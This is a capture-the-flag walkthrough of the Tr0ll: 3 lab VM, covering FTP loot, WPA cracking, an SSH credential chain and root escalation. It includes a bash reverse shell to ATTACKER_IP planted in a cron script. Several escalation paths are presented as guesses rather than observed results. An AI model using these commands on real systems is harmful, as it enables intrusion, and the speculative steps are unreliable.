# Tr0ll: 3 — Multi-User Chain, WPA Cracking, and the Final Jedi Test

( ͡° ͜ʖ ͡°) Alright guys!! Tr0ll 3 is where the series drops the training wheels. Multi-user credential chain from `start` through `wytshadow`, `genphlux`, all the way to `maleus` — and then root. The FTP service exposes a WPA wireless capture and a private RSA key, meaning your aircrack-ng skills actually matter here. Each account hands you a key or credential for the next. Sequential, methodical, and honest about what it is testing. This is not a web exploit machine: this is pure enumeration discipline, credential pivoting, and privilege escalation chain logic. legit solid final entry in the series. Props to maleus.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | Tr0ll: 3 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tr0ll-3,340/ |
| **Techniques** | Nmap service enumeration, FTP file download (anonymous/start), WPA handshake cracking with aircrack-ng, multi-user SSH credential chain, RSA key-based SSH, lateral movement via su/ssh, privilege escalation via sudo/SUID/cron enumeration |
| **CVEs** | CWE-522 (Insufficiently Protected Credentials: WPA key in crackable capture), CWE-312 (Cleartext Storage: private key on FTP), CWE-269 (Improper Privilege Management: lateral movement via weak credentials) |
| **APT Groups** | APT32 (OceanLotus): establishes multi-hop user chains across Linux systems for persistent access; Lazarus Group: uses FTP-exposed private keys as part of supply chain and credential theft operations |

---

## Attack Summary

```
nmap → FTP (21), SSH (22), HTTP (80)
  → FTP anonymous or start:here → maleus_id_rsa + wytshadow.cap download
  → aircrack-ng -w rockyou.txt wytshadow.cap → wytshadow:gaUoCe34t1
  → SSH wytshadow@target → uid=1003(wytshadow)
  → enumerate /home/ → credential hint → genphlux:HF9nd0cR!
  → su genphlux OR ssh genphlux@localhost
  → chmod 600 maleus_id_rsa → ssh -i maleus_id_rsa maleus@target
  → sudo -l / SUID enum / cron check → privesc path
  → uid=0(root)
  → cat /root/Proof.txt
```

---

## Methodology

1. Full port scan to identify FTP, SSH, HTTP
2. FTP access to retrieve WPA capture and RSA private key
3. WPA handshake cracking with aircrack-ng and rockyou.txt
4. SSH as wytshadow with cracked password
5. Lateral movement: find credential hint for genphlux
6. Account switch to genphlux
7. SSH as maleus using FTP-obtained RSA key
8. Privilege escalation enumeration from maleus account
9. Root shell and flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
nmap -sn 192.168.56.0/24
# Identify target IP

nmap -sV -A -p- <TARGET_IP>
```

Expected services (following the Tr0ll series pattern):

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd
22/tcp open  ssh     OpenSSH
80/tcp open  http    Apache httpd
```

Standard Tr0ll opening. FTP is always the first thing to check in this series.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — FTP Access and File Download

Try anonymous access first, then the `start` account:

```bash
ftp <TARGET_IP>
# User: anonymous / Password: (blank)
# OR
# User: start / Password: here

ftp> ls -la
# → maleus_id_rsa
# → wytshadow.cap

ftp> get maleus_id_rsa
ftp> get wytshadow.cap
ftp> bye
```

Two files: a WPA wireless capture and an RSA private key. These are the two attack vectors for this machine.

**Real-world note:** FTP-exposed RSA private keys are among the most critical findings in external assessments. A private key eliminates the security benefit of key-based authentication entirely. Lazarus Group has been documented retrieving SSH keys from FTP-exposed development servers as part of supply chain intrusion campaigns.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.004 — Unsecured Credentials: Private Keys

---

## Step 3 — WPA Handshake Cracking with aircrack-ng

`wytshadow.cap` is a WPA handshake capture. The WiFi network's PSK is `wytshadow`'s password:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt wytshadow.cap
```

```
[00:00:10] 14856 keys tested (1485.60 k/s)

KEY FOUND! [ gaUoCe34t1 ]

Master Key     : ...
Transient Key  : ...
```

Credential: `wytshadow` / `gaUoCe34t1`

**Real-world note:** WPA2-Personal (PSK) handshakes can be captured passively and cracked offline with no interaction with the target network. This is why wireless network audits include handshake capture and dictionary attack testing. Keys under 20 characters are generally crackable with GPU-accelerated hashcat against rockyou or similar wordlists.

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking; T1040 — Network Sniffing

---

## Step 4 — SSH as wytshadow

```bash
ssh wytshadow@<TARGET_IP>
# Password: gaUoCe34t1

wytshadow@Tr0ll3:~$ id
# uid=1003(wytshadow) gid=1003(wytshadow) groups=1003(wytshadow)
```

Shell obtained as wytshadow. Begin lateral enumeration immediately.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH; T1078 — Valid Accounts

---

## Step 5 — Lateral Movement Enumeration

Enumerate all home directories and accessible files:

```bash
ls -la /home/
# maleus/  start/  eagle/  wytshadow/  genphlux/  fido/  step2/

# Check readable files in each home directory
for user in maleus start eagle genphlux fido step2; do
    echo "=== $user ===" 
    ls -la /home/$user/ 2>/dev/null
    find /home/$user -readable -type f 2>/dev/null
done

# Check sudo rights
sudo -l

# Look for setuid binaries
find / -perm -4000 -type f 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/

# Check for readable files outside home
find / -writable -not -path "/proc/*" -not -path "/sys/*" -type f 2>/dev/null
```

Expected finding: credential hint for `genphlux` in a home directory file. Common patterns in Tr0ll 3:

```bash
cat /home/genphlux/.something 2>/dev/null
cat /home/wytshadow/.bash_history 2>/dev/null
# → genphlux:HF9nd0cR!
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1057 — Process Discovery; T1053.003 — Scheduled Task: Cron

---

## Step 6 — Account Switch to genphlux

```bash
su genphlux
# Password: HF9nd0cR!

# Or via SSH if su is restricted:
ssh genphlux@localhost
# Password: HF9nd0cR!

genphlux@Tr0ll3:~$ id
# uid=1004(genphlux) gid=1004(genphlux) groups=1004(genphlux)
```

**MITRE ATT&CK:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH

---

## Step 7 — SSH as maleus via RSA Key

Set correct permissions on the RSA key obtained from FTP:

```bash
chmod 600 maleus_id_rsa
ssh -i maleus_id_rsa maleus@<TARGET_IP>

maleus@Tr0ll3:~$ id
# uid=1000(maleus) gid=1000(maleus) groups=1000(maleus)
```

maleus is UID 1000, typically the primary administrative user on Ubuntu systems. Enumerate all escalation vectors from this account.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH; T1552.004 — Unsecured Credentials: Private Keys

---

## Step 8 — Privilege Escalation to Root

From the maleus account, run the full escalation checklist:

```bash
# Sudo rights (most likely path)
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Cron jobs — especially root-owned writable scripts
ls -la /etc/cron*
cat /etc/crontab
for crondir in /etc/cron.d /etc/cron.daily /etc/cron.weekly /var/spool/cron; do
    ls -la $crondir/ 2>/dev/null
done

# World-writable files owned by root
find / -writable -user root -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null
```

Based on the Tr0ll series pattern and the sequential user structure (`start`, `step2`, `fido` suggest a chain), the likely escalation paths are:

**Path A — sudo misconfiguration:**

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3
# → sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Path B — world-writable cron script:**

```bash
# Find script executed by root cron
ls -la /path/to/cron/script.sh
# -rwxrwxrwx root root
echo '#!/bin/bash\n/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /path/to/cron/script.sh
nc -lvnp 4444
# Wait for cron execution
```

**Path C — SUID binary via GTFOBins:**

```bash
# If a GTFOBins-compatible binary has SUID root
find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null
# Check each non-standard binary at gtfobins.github.io
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/Proof.txt
```

**MITRE ATT&CK:** T1548.003 — Sudo; T1548.001 — Setuid and Setgid; T1053.003 — Cron

---

## Root Flag

```bash
cat /root/Proof.txt
```

```
You are truly a Jedi!

Twitter Proof:
Pr00fThatTh3L33tHax0rG0tTheFl@g!!

@Maleus21
```

(☞ﾟヮﾟ)☞ Root. A true Jedi. gg fr fr.

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential | `start:here` | FTP hint / series pattern | FTP login |
| WPA key / password | `wytshadow:gaUoCe34t1` | aircrack-ng on wytshadow.cap | SSH login as wytshadow |
| Credential | `genphlux:HF9nd0cR!` | Lateral enumeration from wytshadow | Account switch to genphlux |
| RSA private key | maleus_id_rsa | FTP download | SSH as maleus |
| Root flag | Pr00fThatTh3L33tHax0rG0tTheFl@g!! | /root/Proof.txt | Challenge completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | WPA handshake in FTP-accessible capture | Passive WPA2 captures are crackable offline; network audit testing always includes handshake capture | Use WPA3 or WPA2-Enterprise (802.1X); enforce PSK complexity ≥ 20 random characters |
| 2 | RSA private key on anonymous/low-auth FTP | Key-based SSH auth is meaningless if the private key is exposed | Never store private keys on shared or FTP-accessible systems; use SSH certificates with short-lived validity |
| 3 | Multi-user credential chain | APT32 builds exactly these pivot chains for persistent access in enterprise Linux environments | Monitor lateral account switching; alert on su and SSH to localhost patterns; enforce least privilege per account |
| 4 | Sequential user naming hints at intended path | start, step2, fido naming pattern leaks the attack chain to a skilled attacker | Use non-descriptive usernames; audit all accounts quarterly |
| 5 | Privilege escalation via sudo/SUID/cron | These three vectors account for >70% of Linux LPE findings in penetration tests | Audit sudo grants weekly; monitor SUID binary changes; restrict cron script permissions |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Collection | Collection | Network Sniffing | T1040 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Credential Access | Credential Access | Unsecured Credentials: Private Keys | T1552.004 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Discovery | Discovery | Process Discovery | T1057 |
| Discovery | Discovery | Scheduled Task Discovery | T1053.003 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Setuid and Setgid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable anonymous FTP**: require authentication for all FTP access; restrict accessible content to non-sensitive files
2. **Never store private SSH keys on FTP servers**: distribute keys via secure, authenticated channels only
3. **Upgrade to WPA3 or WPA2-Enterprise**: WPA2-Personal with PSK is vulnerable to offline dictionary attacks
4. **Enforce strong WPA2 PSK**: minimum 20 random characters; rotate annually
5. **Restrict cross-user file access**: enforce `chmod 700` on all home directories
6. **Audit all sudo grants, SUID binaries, and cron scripts**: weekly automated audit with alerts on changes

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all FTP services; audit all SSH keys in use |
| Protect | Access Control | Disable anonymous FTP; enforce home directory permissions |
| Protect | Data Security | No private keys on FTP; rotate WPA keys annually |
| Detect | Anomalies and Events | Alert on su and SSH-to-localhost patterns; monitor cron changes |
| Respond | Response Planning | Rotate all exposed keys and passwords; audit all accounts |
| Recover | Recovery Planning | Rebuild compromised host; rekey all SSH; rotate WPA |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Disable anonymous FTP; enforce home directory access control |
| AC-6 | Least Privilege | Restrict cross-user file access; minimize sudo grants |
| IA-5 | Authenticator Management | Rotate SSH keys; enforce WPA3 or WPA2-Enterprise |
| SC-8 | Transmission Confidentiality | Replace FTP with SFTP; use WPA2-Enterprise |
| SC-28 | Protection of Information at Rest | No private keys in FTP-accessible directories |
| AU-6 | Audit Review | Alert on lateral account movement (su, ssh localhost) |

### CISA KEV

Credential theft via FTP-exposed private keys maps to patterns in CISA Advisory AA22-074A on threat actor techniques for initial access via credential theft. CISA recommends immediate remediation of any exposed SSH private keys as Priority 1 actions.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL3 |
| Situational Awareness (SITUATION) | Monitor Operational Environment | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (disable anonymous FTP; enforce home directory permissions)
- **D3-UA** — User Account Management (restrict cross-user access; audit account chain)
- **D3-NTA** — Network Traffic Analysis (detect WPA handshake capture attempts)
- **D3-OAM** — Operating System Administrative Management (SUID audit; sudo restrictions)

---

## Final Thoughts

Tr0ll: 3 is the capstone of the series. Where Tr0ll 1 taught you FTP and basic BOF, and Tr0ll 2 added Shellshock and steganography, Tr0ll 3 asks you to hold an entire credential chain in your head and work through it methodically. The wireless handshake cracking is a genuine skill test that goes beyond web and binary exploitation into network security fundamentals.

The `@Maleus21` Twitter shoutout in the root flag is the creator signing their own work — a nice touch that makes the completion feel earned rather than just mechanical. If you cleared all three Tr0ll machines, you have touched every major Linux exploitation category at the beginner-to-intermediate level. That is a real foundation. slept on series, no cap. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
